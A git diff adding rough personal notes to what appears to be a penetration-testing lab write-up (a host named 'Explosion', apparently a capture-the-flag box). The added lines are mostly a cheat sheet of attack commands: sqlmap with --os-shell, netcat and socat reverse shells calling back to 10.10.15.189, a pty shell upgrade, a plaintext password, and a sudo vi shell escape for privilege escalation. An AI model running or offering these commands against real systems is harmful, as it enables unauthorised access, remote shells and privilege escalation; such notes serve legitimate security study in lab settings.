@@ -46,3 +46,29 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 [03:25:50:214] [2009:2010] [WARN][com.freerdp.crypto] - CN = Explosion
 
 ```
+
+
+PLEASE COMBINE THIS FILE WITH HELPFUL SHIT   
+
+* we can copy the request into a file and then put the file in `sqlmap` as follows if we're suspecting an sql injection  
+
+```console
+sqlmap -r [FILE NAME]
+```
+
+* We can also use the switch/option/flag `--os-shell` to get a shell from the sql injection.
+
+
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.189 1234 >/tmp/f
+
+socat exec:'bash -li',pty,stderr,setsid,sane tcp:10.10.15.189:4444
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+P@s5w0rd!
+
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf :set shell=/bin/sh
+:shell
+
+
